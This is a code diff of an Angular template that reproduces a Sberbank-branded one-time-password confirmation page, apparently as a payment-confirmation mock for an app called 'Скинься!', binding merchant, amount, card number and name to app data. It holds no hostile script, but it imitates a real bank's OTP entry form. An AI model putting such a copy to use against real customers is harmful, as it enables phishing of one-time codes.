@@ -1,9 +1,9 @@
 <link href="assets/style.css" rel="STYLESHEET" type="text/css">
 <link href="assets/ma_style.css" rel="STYLESHEET" type="text/css">
 
+<router-outlet></router-outlet>
 
-
-<div class="modal-page">
+<div class="modal-page" *ngIf="showForm">
   <div class="header">
     <div>
       <img src="assets/sberbank/images/MyBank.png">
@@ -16,40 +16,39 @@
     <div class="list" id="descList" style="display: block;">
       <div class="list-item" id="pa_merchant">
         <div class="labelSber">Магазин:</div>
-        <div class="value">Tinkoff Bank</div>
+        <div class="value">Приложение "Скинься!"</div>
       </div>
       <div class="list-item" id="pa_desc">
         <div class="labelSber">Описание:</div>
-        <div class="value">На добрые дела</div>
+        <div class="value">{{initData.purposeDescription}}</div>
       </div>
       <div class="list-item" id="pa_amount">
         <div class="labelSber">Сумма:</div>
-        <div class="value"><b>10.00 RUB</b></div>
+        <div class="value"><b>{{initData.amount}}</b><b> RUB</b></div>
       </div>
       <div class="list-item" id="pa_date">
         <div class="labelSber">Дата:</div>
-        <div class="value">11/24/2017</div>
+        <div class="value">{{initData.paymentDate}}</div>
       </div>
       <div class="list-item" id="pa_pan">
         <div class="labelSber">Номер карты:</div>
-        <div class="value"> **** **** **** 2101</div>
+        <div class="value">{{initData.cardNumber}}</div>
       </div>
       <div class="list-item" id="pamrow">
         <div class="labelSber">Личное приветствие:</div>
-        <div class="value">Hello
-        </div>
+        <div class="value">Здравствуйте, {{initData.personName}}</div>
       </div>
 
       </div>
 
-    <div id="desc" class="desc"><p>Одноразовый пароль был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите пароль из SMS.</p></div>
+    <div id="desc" class="desc"><p>Одноразовый пароль был направлен на Ваш номер телефона. Пожалуйста, проверьте реквизиты транзакции и введите пароль из Push сообщения.</p></div>
     <div class="list">
 
       <input class="big-input" id="psw_id" type="password" placeholder="Одноразовый SMS пароль" name="PASSWORD" size="20" maxlength="20" autocomplete="off" #smspass>
       <p class="desc">
         <input type="hidden" name="PSW_RENEW" value="Y">
         <input type="hidden" name="TRIES" value="Y">
-        <a class="small" href="javascript:void(0);" onclick="javascript:resendSMS(); return false;">Не получили одноразовый пароль по SMS?</a>
+        <a class="small" href="javascript:void(0);" (click)="regenerateCode()">Не получили одноразовый пароль по SMS?</a>
       </p>
 
       <div class="footer">
@@ -69,5 +68,3 @@
     <input type="hidden" name="formaction" value="pa.submit">
   </form>
 </div>
-
-<router-outlet></router-outlet>
